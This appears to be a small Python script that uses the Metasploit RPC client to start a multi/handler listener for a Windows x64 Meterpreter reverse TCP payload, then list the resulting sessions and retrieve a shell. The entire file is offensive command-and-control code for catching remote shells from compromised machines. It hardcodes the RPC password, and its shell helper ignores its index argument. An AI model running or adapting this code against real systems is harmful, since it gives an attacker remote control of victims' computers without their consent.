from metasploit.msfrpc import MsfRpcClient
import os


client = MsfRpcClient('mypassword', port=55553) 

def init(addr, port = 4444):
	# """Launching the msfrpcd deamon"""
	# os.system("msfrpcd -P " + password + " -n -f -a 127.0.0.1")

	exploit = client.modules.use('exploit', 'multi/handler')
	pl = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
	pl['LPORT'] = port
	pl['LHOST'] = addr

	exploit.execute(payload=pl)

def get_sessions():
	return client.sessions.list


def get_session_shell(index):
	return client.sessions.session(1)


